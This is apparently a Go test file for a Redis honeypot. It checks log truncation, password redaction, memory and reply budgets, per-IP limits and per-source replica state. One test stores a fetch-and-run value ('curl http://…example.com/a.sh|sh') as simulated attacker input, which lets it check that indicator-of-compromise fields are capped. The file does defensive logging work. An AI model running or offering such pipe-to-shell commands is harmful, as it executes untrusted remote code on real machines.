package honeypot

import (
	"bufio"
	"bytes"
	"io"
	"log/slog"
	"math"
	"net"
	"strconv"
	"strings"
	"testing"
	"time"
)

func sendArgs(t *testing.T, conn net.Conn, args ...string) {
	t.Helper()
	writeCommand(t, conn, string(encodeRequest(args)))
}

func dialServer(t *testing.T, server *RedisServer) (net.Conn, *bufio.Reader) {
	t.Helper()
	conn, err := net.Dial("tcp", server.Addr().String())
	if err != nil {
		t.Fatalf("Dial returned error: %v", err)
	}
	t.Cleanup(func() { _ = conn.Close() })
	return conn, bufio.NewReader(conn)
}

func eventsOf(events []map[string]any, kind string) []map[string]any {
	var out []map[string]any
	for _, event := range events {
		if event["event"] == kind {
			out = append(out, event)
		}
	}
	return out
}

func commandEvent(t *testing.T, events []map[string]any, command string) map[string]any {
	t.Helper()
	for _, event := range eventsOf(events, "command") {
		if event["command"] == command {
			return event
		}
	}
	t.Fatalf("no command event for %s", command)
	return nil
}

func TestLogLineCapDropsLargestFields(t *testing.T) {
	var out bytes.Buffer
	logger := newCappedJSONLogger(&out, 2048)
	logger.Info("command",
		slog.String("event", "command"),
		slog.String("command", "SET"),
		slog.String("small", "kept"),
		slog.String("big1", strings.Repeat("a", 1500)),
		slog.String("big2", strings.Repeat("b", 1200)),
		slog.Int("number", 7),
	)
	line := out.String()
	if len(line) > 2048 {
		t.Fatalf("line has %d bytes, want at most 2048", len(line))
	}
	events := decodeLogEvents(t, line)
	event := events[0]
	if event["log_truncated"] != true {
		t.Fatalf("log_truncated missing: %v", event)
	}
	if _, ok := event["big1"]; ok {
		t.Fatal("largest field was kept")
	}
	if event["small"] != "kept" || event["event"] != "command" || event["command"] != "SET" || event["number"] != float64(7) {
		t.Fatalf("small fields lost: %v", event)
	}

	out.Reset()
	logger.Info("command", slog.String("event", "command"), slog.String("small", "x"))
	if strings.Contains(out.String(), "log_truncated") {
		t.Fatalf("short line marked truncated: %s", out.String())
	}
}

func TestClientAttributesAreCappedAndValidated(t *testing.T) {
	server, stop := startLoggedServer(t, func(o *ServerOptions) {
		o.Profile, _ = LookupRedisProfile("redis74")
	})
	conn, reader := dialServer(t, server)

	sendArgs(t, conn, "CLIENT", "SETNAME", strings.Repeat("n", 10000))
	if got := readRESP(t, reader); got != "+OK\r\n" {
		t.Fatalf("CLIENT SETNAME got %q", got)
	}
	sendArgs(t, conn, "CLIENT", "SETINFO", "lib-name", "bad name")
	if got := readRESP(t, reader); got != "-ERR lib-name cannot contain spaces, newlines or special characters.\r\n" {
		t.Fatalf("CLIENT SETINFO with a space got %q", got)
	}
	sendArgs(t, conn, "CLIENT", "SETINFO", "LIB-VER", strings.Repeat("v", 10000))
	if got := readRESP(t, reader); got != "+OK\r\n" {
		t.Fatalf("CLIENT SETINFO lib-ver got %q", got)
	}
	sendArgs(t, conn, "CLIENT", "GETNAME")
	if got := readRESP(t, reader); got != "$4096\r\n"+strings.Repeat("n", 4096)+"\r\n" {
		t.Fatalf("CLIENT GETNAME got %d bytes, want the 4096 bytes kept", len(got))
	}
	sendArgs(t, conn, "PING")
	readRESP(t, reader)
	_ = conn.Close()

	events := decodeLogEvents(t, stop())
	ping := commandEvent(t, events, "PING")
	if name, _ := ping["client_name"].(string); len(name) != maxLoggedClientBytes || ping["client_name_truncated"] != true {
		t.Fatalf("client_name has %d bytes (truncated %v), want %d and the flag", len(name), ping["client_name_truncated"], maxLoggedClientBytes)
	}
	if version, _ := ping["client_library_version"].(string); len(version) != maxLoggedClientBytes {
		t.Fatalf("client_library_version has %d bytes", len(version))
	}
	if _, ok := ping["client_library_name"]; ok {
		t.Fatal("rejected lib-name was stored")
	}
}

func TestAttackerFieldsAreCapped(t *testing.T) {
	server, stop := startLoggedServer(t, nil)
	conn, reader := dialServer(t, server)
	longKey := strings.Repeat("k", 5000)
	sendArgs(t, conn, "GET", longKey)
	readRESP(t, reader)
	sendArgs(t, conn, "SLAVEOF", strings.Repeat("h", 3000), "6379")
	readRESP(t, reader)
	sendArgs(t, conn, "SET", "url", "curl http://"+strings.Repeat("x", 3000)+".example.com/a.sh|sh")
	readRESP(t, reader)
	_ = conn.Close()

	events := decodeLogEvents(t, stop())
	get := commandEvent(t, events, "GET")
	if key, _ := get["key"].(string); len(key) != maxLoggedFieldBytes || get["key_truncated"] != true {
		t.Fatalf("key has %d bytes, truncated %v", len(key), get["key_truncated"])
	}
	slave := commandEvent(t, events, "SLAVEOF")
	if host, _ := slave["replica_host"].(string); len(host) != maxLoggedFieldBytes || slave["replica_host_truncated"] != true {
		t.Fatalf("replica_host has %d bytes", len(host))
	}
	set := commandEvent(t, events, "SET")
	if set["ioc_truncated"] != true {
		t.Fatalf("ioc_truncated missing: %v", set)
	}
	for _, field := range []string{"ioc_urls", "ioc_domains"} {
		for _, entry := range strings.Fields(stringOr(set[field])) {
			if len(entry) > maxLoggedFieldBytes {
				t.Fatalf("%s entry has %d bytes", field, len(entry))
			}
		}
	}
	if _, ok := get["key_pattern_truncated"]; ok {
		t.Fatal("flag for a field that is not there")
	}
}

func stringOr(value any) string {
	text, _ := value.(string)
	return text
}

func TestPasswordsAreRedacted(t *testing.T) {
	cases := [][]string{
		{"HELLO", "3", "AUTH", "default", "s3cret-hello"},
		{"CONFIG", "SET", "maxmemory", "100", "requirepass", "s3cret-config"},
		{"CONFIG", "SET", "masterauth", "s3cret-master"},
		{"MIGRATE", "h", "1", "k", "0", "5", "AUTH2", "u", "s3cret-migrate", "KEYS", "a"},
	}
	for _, args := range cases {
		logged := strings.Join(redactedArgsForLog(args), " ")
		if strings.Contains(logged, "s3cret") {
			t.Fatalf("%s: password in %q", args[0], logged)
		}
	}
	attrs := commandAnalysisAttrs([]string{"CONFIG", "SET", "masterauth", "s3cret-master"})
	for _, attr := range attrs {
		if attr.Key == "config_value" && strings.Contains(attr.Value.String(), "s3cret") {
			t.Fatal("masterauth in config_value")
		}
	}
}

func TestRequestSize(t *testing.T) {
	for _, args := range [][]string{{"PING"}, {"SET", "k", strings.Repeat("v", 12345)}, {""}} {
		if got, want := requestSize(args), int64(len(encodeRequest(args))); got != want {
			t.Fatalf("requestSize(%d args) = %d, want %d", len(args), got, want)
		}
	}
}

func TestDataBudget(t *testing.T) {
	options := DefaultServerOptions()
	options.Address = "127.0.0.1:0"
	options.Logger = slog.New(slog.NewTextHandler(io.Discard, nil))
	options.MaxDataBytes = 4096
	server, err := NewRedisServerWithOptions(options)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(server.Stop)
	state := &clientState{connected: time.Now()}
	before := parseInfoInt(t, parseInfo(t, infoText(server, "memory")), "used_memory")

	if got := call(server, state, "SET", "a", strings.Repeat("x", 3000)); got != "+OK\r\n" {
		t.Fatalf("SET within budget got %q", got)
	}
	after := parseInfoInt(t, parseInfo(t, infoText(server, "memory")), "used_memory")
	if after-before < 3000 {
		t.Fatalf("used_memory grew by %d, want the stored bytes", after-before)
	}
	oom := "-OOM command not allowed when used memory > 'maxmemory'.\r\n"
	if got := call(server, state, "SET", "b", strings.Repeat("y", 3000)); got != oom {
		t.Fatalf("SET over budget got %q", got)
	}
	if got := call(server, state, "CONFIG", "SET", "dir", "/tmp"); got != "+OK\r\n" {
		t.Fatalf("CONFIG SET of a short value got %q", got)
	}
	if got := call(server, state, "CONFIG", "SET", "masterauth", strings.Repeat("p", 3000)); got != oom {
		t.Fatalf("CONFIG SET over budget got %q", got)
	}
	if got := call(server, state, "SET", "a", "small"); got != "+OK\r\n" {
		t.Fatalf("overwrite got %q", got)
	}
	if got := call(server, state, "SET", "b", strings.Repeat("y", 3000)); got != "+OK\r\n" {
		t.Fatalf("SET after the overwrite freed bytes got %q", got)
	}
	call(server, state, "FLUSHALL")
	if used := server.budget.bytes(); used != 0 {
		t.Fatalf("budget holds %d bytes after FLUSHALL", used)
	}
	call(server, state, "SET", "c", "1", "PX", "1")
	time.Sleep(5 * time.Millisecond)
	call(server, state, "DBSIZE")
	if used := server.budget.bytes(); used != 0 {
		t.Fatalf("budget holds %d bytes after the key expired", used)
	}
}

func TestStoreCountsStayExact(t *testing.T) {
	store := NewStore()
	store.Set(0, "a", "1")
	store.SetWithExpiry(0, "b", "2", time.Now().Add(time.Hour), false)
	store.SetWithExpiry(1, "c", "3", time.Now().Add(time.Millisecond), false)
	store.Expire(0, "a", time.Now().Add(time.Hour))
	store.Persist(0, "b")
	time.Sleep(5 * time.Millisecond)

	keyspace := store.Keyspace()
	if got := keyspace[0]; got.keys != 2 || got.expires != 1 {
		t.Fatalf("db0 got %+v, want 2 keys, 1 expire", got)
	}
	if _, ok := keyspace[1]; ok {
		t.Fatalf("db1 still listed after its key expired: %+v", keyspace[1])
	}
	store.Del(0, []string{"a"})
	if got := store.Keyspace()[0]; got.keys != 1 || got.expires != 0 {
		t.Fatalf("db0 after DEL got %+v", got)
	}
}

func TestScriptCacheByteCap(t *testing.T) {
	budget := newMemBudget(1 << 30)
	cache := newScriptCacheWithBudget(budget)
	body := strings.Repeat("-", 1<<20)
	for i := 0; i < 12; i++ {
		cache.add(body + strconv.Itoa(i))
	}
	if cache.bytes > maxScriptCacheBytes || budget.bytes() != cache.bytes {
		t.Fatalf("cache holds %d bytes, budget %d", cache.bytes, budget.bytes())
	}
	if _, ok := cache.get(scriptSHA1(body + "11")); !ok {
		t.Fatal("newest script was dropped")
	}
	if _, ok := cache.get(scriptSHA1(body + "0")); ok {
		t.Fatal("oldest script was kept")
	}
	cache.flush()
	if budget.bytes() != 0 {
		t.Fatalf("budget holds %d bytes after the flush", budget.bytes())
	}
}

func TestPerIPClientLimitAndRefusedLog(t *testing.T) {
	server, stop := startLoggedServer(t, func(o *ServerOptions) {
		o.MaxClientsPerIP = 2
	})
	for i := 0; i < 2; i++ {
		conn, reader := dialServer(t, server)
		writeCommand(t, conn, "PING\r\n")
		if got := readRESP(t, reader); got != "+PONG\r\n" {
			t.Fatalf("connection %d got %q", i, got)
		}
	}
	for i := 0; i < 3; i++ {
		conn, reader := dialServer(t, server)
		if got := readRESP(t, reader); got != "-ERR max number of clients reached\r\n" {
			t.Fatalf("refused connection %d got %q", i, got)
		}
		_ = conn.Close()
	}

	events := decodeLogEvents(t, stop())
	refused := eventsOf(events, "refused")
	if len(refused) != 1 {
		t.Fatalf("got %d refused lines, want 1 per minute", len(refused))
	}
	if refused[0]["reason"] != "max_clients_per_ip" || refused[0]["refused_count"] != float64(1) || refused[0]["src_ip"] != "127.0.0.1" {
		t.Fatalf("refused line: %v", refused[0])
	}
}

func TestReplyBudgetClosesConnection(t *testing.T) {
	server, stop := startLoggedServer(t, func(o *ServerOptions) {
		o.MaxReplyBytes = 100 * 1024
	})
	conn, reader := dialServer(t, server)
	sendArgs(t, conn, "SET", "big", strings.Repeat("x", 200*1024))
	if got := readRESP(t, reader); got != "+OK\r\n" {
		t.Fatalf("SET got %q", got)
	}
	sendArgs(t, conn, "GET", "big")
	_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	if rest, _ := io.ReadAll(reader); len(rest) != 0 {
		t.Fatalf("got %d bytes, want the connection closed without a reply", len(rest))
	}
	if server.replyBytes.Load() != 0 {
		t.Fatalf("reply budget holds %d bytes", server.replyBytes.Load())
	}

	events := decodeLogEvents(t, stop())
	get := commandEvent(t, events, "GET")
	if get["reply_limited"] != true || get["outcome"] != "connection_closed" {
		t.Fatalf("GET event: %v", get)
	}
}

func TestConnectionFieldsInHelloAndClientInfo(t *testing.T) {
	server, stop := startLoggedServer(t, func(o *ServerOptions) {
		o.Profile, _ = LookupRedisProfile("redis74")
	})
	defer stop()
	conn, reader := dialServer(t, server)
	sendArgs(t, conn, "CLIENT", "INFO")
	info := readRESP(t, reader)
	if !strings.Contains(info, "addr="+conn.LocalAddr().String()+" ") ||
		!strings.Contains(info, "laddr="+conn.RemoteAddr().String()+" ") ||
		!strings.Contains(info, " fd=8 ") || !strings.Contains(info, " resp=2 ") {
		t.Fatalf("CLIENT INFO got %q", info)
	}
	sendArgs(t, conn, "HELLO")
	if hello := readRESP(t, reader); !strings.Contains(hello, "$5\r\nproto\r\n:2\r\n") {
		t.Fatalf("HELLO got %q", hello)
	}
}

func TestExpireOverflow(t *testing.T) {
	maxText := strconv.FormatInt(math.MaxInt64, 10)
	modern := newTestServer(t, "redis74")
	state := &clientState{connected: time.Now()}
	if got := call(modern, state, "SET", "k", "v", "EX", maxText); got != "-ERR invalid expire time in 'set' command\r\n" {
		t.Fatalf("SET EX max got %q", got)
	}
	if got := call(modern, state, "SET", "k", "v", "PX", maxText); got != "-ERR invalid expire time in 'set' command\r\n" {
		t.Fatalf("SET PX max got %q", got)
	}
	call(modern, state, "SET", "k", "v")
	if got := call(modern, state, "EXPIRE", "k", maxText); got != "-ERR invalid expire time in 'expire' command\r\n" {
		t.Fatalf("EXPIRE max got %q", got)
	}
	if got := call(modern, state, "PEXPIRE", "k", maxText); got != "-ERR invalid expire time in 'pexpire' command\r\n" {
		t.Fatalf("PEXPIRE max got %q", got)
	}
	// 400 years: beyond a Go Duration, fine for Redis.
	if got := call(modern, state, "EXPIRE", "k", "12614400000"); got != ":1\r\n" {
		t.Fatalf("EXPIRE 400 years got %q", got)
	}
	if got := call(modern, state, "TTL", "k"); got != ":12614400000\r\n" {
		t.Fatalf("TTL got %q", got)
	}

	legacy := newTestServer(t, "redis50")
	call(legacy, state, "SET", "k", "v")
	if got := call(legacy, state, "EXPIRE", "k", maxText); got != ":1\r\n" {
		t.Fatalf("redis50 EXPIRE max got %q, want the wrapped expiry", got)
	}
}

func TestReplicaStateIsPerSource(t *testing.T) {
	server := newTestServer(t, "redis74")
	server.options.ReplicaStateTTL = 50 * time.Millisecond
	a := &clientState{connected: time.Now(), remoteIP: "192.0.2.1"}
	b := &clientState{connected: time.Now(), remoteIP: "192.0.2.2"}

	if got := call(server, a, "SLAVEOF", "198.51.100.7", "8886"); got != "+OK\r\n" {
		t.Fatalf("SLAVEOF got %q", got)
	}
	if got := call(server, a, "ROLE"); !strings.Contains(got, "slave") {
		t.Fatalf("ROLE of A got %q", got)
	}
	if got := call(server, b, "ROLE"); !strings.Contains(got, "master") {
		t.Fatalf("ROLE of B got %q, the master of A leaked", got)
	}
	if got := call(server, b, "SET", "x", "1"); got != "+OK\r\n" {
		t.Fatalf("SET of B got %q", got)
	}
	if got := call(server, a, "SET", "x", "1"); !strings.HasPrefix(got, "-READONLY") {
		t.Fatalf("SET of A got %q, want READONLY", got)
	}
	if got := call(server, a, "SLAVEOF", "198.51.100.7", "8886"); got != "+OK Already connected to specified master\r\n" {
		t.Fatalf("second SLAVEOF got %q", got)
	}
	time.Sleep(80 * time.Millisecond)
	if got := call(server, a, "ROLE"); !strings.Contains(got, "master") {
		t.Fatalf("ROLE of A after the TTL got %q", got)
	}
}
